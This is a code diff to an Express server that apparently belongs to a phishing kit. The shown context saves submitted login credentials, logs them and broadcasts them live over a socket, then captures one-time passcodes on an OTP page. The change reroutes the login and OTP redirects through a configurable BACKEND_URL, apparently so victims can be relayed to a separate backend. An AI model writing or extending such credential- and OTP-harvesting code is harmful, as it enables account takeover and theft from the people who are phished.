@@ -279,10 +279,10 @@ app.post('/login', async (req, res) => {
     console.log('Saved login detail:', savedCredential);
     io.emit('loginSaved', savedCredential);
     await logCurrentLoginAndOtp();
-    return res.redirect(`/otp?sessionId=${encodeURIComponent(sessionId)}`);
+    return res.redirect(`${BACKEND_URL}/otp?sessionId=${encodeURIComponent(sessionId)}`);
   } catch (error) {
     console.error('Error saving login data:', error);
-    return res.redirect('/');
+    return res.redirect(BACKEND_URL + '/');
   }
 });
 
@@ -290,7 +290,7 @@ app.post('/otp', async (req, res) => {
   try {
     const { code, sessionId } = req.body;
     if (!code) {
-      return res.redirect('/otp');
+      return res.redirect(`${BACKEND_URL}/otp`);
     }
 
     await logAccessEvent(req, 'User submitted OTP');
